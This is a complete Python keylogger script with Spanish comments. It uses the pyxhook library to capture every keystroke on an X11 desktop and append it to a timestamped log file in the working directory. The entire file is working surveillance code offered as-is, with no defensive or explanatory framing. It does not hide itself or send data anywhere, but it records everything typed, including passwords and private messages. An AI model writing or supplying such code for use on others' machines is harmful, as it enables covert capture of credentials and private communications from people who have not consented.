import os
from datetime import datetime
import pyxhook

def main():
    # Especifica el nombre del archivo (puede ser cambiado)
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

    # La función de registro con el parámetro {event}
    def OnKeyPress(event):
        with open(log_file, "a") as f:
            if event.Key == 'Return':  # La tecla 'Enter' se llama 'Return' en pyxhook
                f.write('\n')
            else:
                f.write(event.Key)  # Event.Key ya es el carácter correcto

    # Crea un objeto HookManager
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()  # Configura el hook

    try:
        new_hook.start()  # Inicia el hook
    except KeyboardInterrupt:
        # El usuario canceló desde la línea de comandos, así que cierra el listener
        new_hook.cancel()
    except Exception as ex:
        # Escribe excepciones en el archivo de registro para análisis posterior
        msg = f"Error mientras se capturaban los eventos:\n  {ex}"
        print(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")

if __name__ == "__main__":
    main()
